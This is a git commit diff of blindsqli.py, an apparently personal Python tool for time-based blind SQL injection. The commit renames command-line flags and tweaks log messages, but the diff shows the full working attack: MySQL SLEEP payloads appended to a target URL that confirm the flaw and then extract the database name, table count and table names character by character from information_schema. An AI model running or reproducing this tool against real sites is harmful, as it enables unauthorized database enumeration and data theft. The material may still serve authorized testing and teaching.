e111c2fd64634d9e0931953cc656a9911f6b3775
Felicia Angelina <feliciaangelina41@gmail.com>
2022-07-07 18:42:35 +0700

    Update blindsqli.py

--- blindsqli.py
+++ blindsqli.py
@@ -9,14 +9,16 @@ parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpForm
 epilog = textwrap.dedent('''
 Example: blindsqli.py -u https://www.test.com/index.php?id=1
          blindsqli.py -u https://www.test.com/index.php?id=1 -a
-         blindsqli.py -u https://www.test.com/index.php?id=1 -d
-         blindsqli.py -u https://www.test.com/index.php?id=1 -t -s 5
+         blindsqli.py -u https://www.test.com/index.php?id=1 -db
+         blindsqli.py -u https://www.test.com/index.php?id=1 -tb -s 5
     '''))
 parser.add_argument('-u', '--url', type=str, help='url to be checked', required=True)
-parser.add_argument('-d', '--database', help='get database name', action="store_true")
-parser.add_argument('-t', '--table', help='get table name', action="store_true")
+#parser.add_argument('-t', '--time', help='check SQLI using time based', action="store_true")
+parser.add_argument('-s', '--secs', type=int, help='set time for blind sqli (default=3)', default=3)
+#parser.add_argument('-b', '--boolean', help='check SQLI using boolean based', action="store_true")
+parser.add_argument('-db', '--database', help='get database name', action="store_true")
+parser.add_argument('-tb', '--table', help='get table name', action="store_true")
 parser.add_argument('-a', '--all', help='get all database and table name', action="store_true")
-parser.add_argument('-s', '--time', type=int, help='set time for blind sqli (default=3)', default=3)
 args = parser.parse_args()
 
 chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
@@ -30,11 +32,11 @@ COLOR = {
 }
 
 def check_url():
-    query = "' AND (SELECT IF(STRCMP('a','a') = 0,SLEEP(%s),null))#" % (args.time)
+    query = "' AND (SELECT IF(STRCMP('a','a') = 0,SLEEP(%s),null))#" % (args.secs)
     url = args.url + quote_plus(query)
     request = requests.get(url)
     time = request.elapsed.total_seconds()
-    if time > args.time:
+    if time > args.secs:
         return True
     else:
         return False
@@ -43,31 +45,31 @@ def check_db():
     db_name = ""
     db_length = 0
     for num in range(50):
-        query = "' AND (SELECT IF(LENGTH(database()) = %s,sleep(%s),null))#" % (num, args.time)
+        query = "' AND (SELECT IF(LENGTH(database()) = %s,sleep(%s),null))#" % (num, args.secs)
         url = args.url + quote_plus(query)
         request = requests.get(url)
         time = request.elapsed.total_seconds()
-        if time > args.time:
+        if time > args.secs:
             db_length = num
     
     for pointer in range(1, db_length+1):
         for char in chars:
-            query = "' AND (SELECT IF(SUBSTR(database(),%s,1) like '%s',sleep(%s),null))#" % (pointer, char, args.time)
+            query = "' AND (SELECT IF(SUBSTR(database(),%s,1) like '%s',sleep(%s),null))#" % (pointer, char, args.secs)
             url = args.url + quote_plus(query)
             request = requests.get(url)
             time = request.elapsed.total_seconds()
-            if time > args.time:
+            if time > args.secs:
                 db_name += char
                 break
     return db_name
 
 def check_total_tbl():
     for num in range(20):
-        query = "' AND (SELECT IF(SUBSTR((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()),1,2) = %s,sleep(%s),null))#" % (num, args.time)
+        query = "' AND (SELECT IF(SUBSTR((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database()),1,2) = %s,sleep(%s),null))#" % (num, args.secs)
         url = args.url + quote_plus(query)
         request = requests.get(url)
         time = request.elapsed.total_seconds()
-        if time > args.time:
+        if time > args.secs:
             return num
 
 def check_table(total):
@@ -77,11 +79,11 @@ def check_table(total):
     for point_table in range (0, total):
         for point_char in range (20):
             for char in chars:
-                query = "' AND (SELECT IF(ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema = database() LIMIT %s,1),%s,1)) LIKE ASCII('%s'),sleep(%s),null))#" % (point_table, point_char, char, args.time)
+                query = "' AND (SELECT IF(ASCII(SUBSTR((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema = database() LIMIT %s,1),%s,1)) LIKE ASCII('%s'),sleep(%s),null))#" % (point_table, point_char, char, args.secs)
                 url = args.url + quote_plus(query)
                 request = requests.get(url)
                 time = request.elapsed.total_seconds()
-                if time > args.time:
+                if time > args.secs:
                     temp += char
                     break
         if temp != "":
@@ -97,12 +99,16 @@ def main():
 /____/_/_/_//_/\_,_/___/\___\_\/____/___/  
 """)
     print("[>] Url: " + f"{COLOR['YELLOW']}{args.url}{COLOR['ENDC']}")
-    print("[>] Sleep Time: " + f"{COLOR['YELLOW']}{args.time} seconds{COLOR['ENDC']}\n")
+    # if args.boolean:
+    #     print("[>] Using: " + f"{COLOR['YELLOW']}Boolean-based Blind SQLi{COLOR['ENDC']}")
+    # else:
+    print("[>] Using: " + f"{COLOR['YELLOW']}Time-based Blind SQLi{COLOR['ENDC']}")
+    print("[>] Sleep Time: " + f"{COLOR['YELLOW']}{args.secs} seconds{COLOR['ENDC']}\n")
 
     try:
-        print("[+] Checking the url...")
+        print("[INFO] Checking the url...")
         if check_url():
-            print("[+] Url is vulnerable to SQL Injection")
+            print("[INFO] Url is vulnerable to SQL Injection")
         else:
             print(f"{COLOR['RED']}[!] Url unable to do SQL Injection.{COLOR['ENDC']}")
             sys.exit(1)
@@ -113,14 +119,11 @@ def main():
             print("[!] Keyboard interrupt detected! Exiting program...")
     except Exception as e:
         print(f"{COLOR['RED']}[!] Exception: {e}{COLOR['ENDC']}")
-        # print(f"{COLOR['RED']}[!] Unable to do SQL Injection.{COLOR['ENDC']}")
         sys.exit(1)
-    
-    if args.database or args.table or args.all:
-        print("[+] Processing to do SQL Injection...")
 
     if args.database or args.all:
         try:
+            print("[INFO] Fetching database name.")
             print(f"{COLOR['GREEN']}[>] Database name: {check_db()}{COLOR['ENDC']}")
         except KeyboardInterrupt:
             print("[!] Keyboard interrupt detected! Exiting program...")
@@ -129,9 +132,10 @@ def main():
 
     if args.table or args.all:
         try:
+            print("[INFO] Fetching number of table.")
             total = check_total_tbl()
             print(f"{COLOR['GREEN']}[>] Total table: {total}{COLOR['ENDC']}")
-            print("[+] Checking tables name, it might take so time. Do not panic if it looks stuck.")
+            print("[INFO] Fetching tables name, it might take so time. Do not panic if it looks stuck.")
             tbl_name = check_table(total)
             print(f"{COLOR['GREEN']}[>] Tables name: " + ', '.join(map(str,tbl_name)) + f"{COLOR['ENDC']}")
         except KeyboardInterrupt:
